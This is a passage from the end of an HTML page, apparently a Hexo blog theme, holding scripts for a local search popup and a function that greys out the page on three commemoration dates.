    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="æƒ³è¦æœäº›ä»€ä¹ˆï¼Ÿ" value=""></div><div class="search-result-container"></div></div><script>function initMourn() {
  const date = new Date();
  const today = (date.getMonth() + 1) + "-" + date.getDate()
  const mourn_days = ["4-4","9-18","12-13"]
  if (mourn_days.includes(today)) {
    document.documentElement.style.filter = "grayscale(1)";
  }
}
initMourn();</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body></html>